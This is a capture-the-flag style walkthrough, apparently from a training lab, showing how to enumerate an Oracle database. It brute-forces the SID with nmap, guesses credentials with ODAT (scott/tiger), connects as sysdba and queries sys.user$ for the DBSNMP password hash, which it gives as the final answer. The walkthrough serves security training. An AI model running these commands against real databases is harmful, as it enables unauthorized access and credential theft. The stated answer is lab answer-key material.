
# Oracle Database Enumeration Walkthrough

---

## Task Goal

The objective of this task is to:

1. Enumerate the Oracle service
2. Identify a valid SID
3. Discover valid credentials
4. Connect to the Oracle database
5. Extract the password hash of the user `DBSNMP`

---
## Question.1
> Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

# Screenshot 1 — SID Enumeration

### Command Executed

```bash
nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute
```
<img width="741" height="242" alt="image" src="https://github.com/user-attachments/assets/d8b5d18a-bf27-4e4e-b649-8191550c56ae" />

---

### What is happening in this screenshot

The scan is targeting port **1521**, which is the default Oracle TNS listener port.

The NSE script `oracle-sid-brute` is used to discover valid Oracle SIDs.

---

### Highlighted Output

```
oracle-sid-brute:
  XE
```

---

### Explanation

The script successfully identifies a valid SID:

```
XE
```

This SID is required to authenticate to the Oracle database.

---

# Screenshot 2 — Credential Enumeration Using ODAT

### Command Executed

```bash
odat passwordguesser -s 10.129.205.19 -d XE
```
<img width="729" height="631" alt="image" src="https://github.com/user-attachments/assets/6d7001f4-85c5-4749-a96f-d9260f248bc3" />

---

### What is happening in this screenshot

ODAT is used to:

* Test Oracle accounts
* Attempt password guessing
* Identify valid credentials for SID `XE`

---

### Highlighted Output

```
scott/tiger
```

---

### Explanation

The tool discovers valid credentials:

```
scott/tiger
```

These credentials can now be used to log into the Oracle instance.

---

# Screenshot 3 — Fixing sqlplus Shared Library Error

### Error Shown

```
sqlplus: error while loading shared libraries: libsqlplus.so
```

---

### What is happening in this screenshot

The Oracle client (`sqlplus`) fails to start because the required shared library cannot be located.

You then:

1. Locate the library
2. Add the Oracle client path to the linker configuration
3. Run `ldconfig`
4. Successfully launch `sqlplus`

---

### Commands Used

```bash
find /usr -name "libsqlplus.so" 2>/dev/null
echo /usr/lib/oracle/19.6/client64/lib | sudo tee /etc/ld.so.conf.d/oracle.conf
sudo ldconfig
sqlplus
```
<img width="962" height="900" alt="image" src="https://github.com/user-attachments/assets/01f8381d-5a13-42c1-8094-862c098b753f" />

---

### Explanation

This resolves the missing shared library issue and allows `sqlplus` to run correctly.

---

# Screenshot 4 — Extracting DBSNMP Password Hash

### Command Executed

```bash
sqlplus scott/tiger@10.129.205.19/XE as sysdba
```

Then inside SQL:

```sql
select name, password from sys.user$ where name='DBSNMP';
```
<img width="603" height="368" alt="image" src="https://github.com/user-attachments/assets/b2bea798-dc9c-4a3d-8c0d-736b9fc4aa45" />

---

### Highlighted Output

```
DBSNMP   E066D214D5421CCC
```

---

### What is happening in this screenshot

* Connection is established using discovered credentials.
* The query is executed against `sys.user$`, which stores password hashes.
* The hash for user `DBSNMP` is retrieved.

---

## Final Answer

```
E066D214D5421CCC
```

---
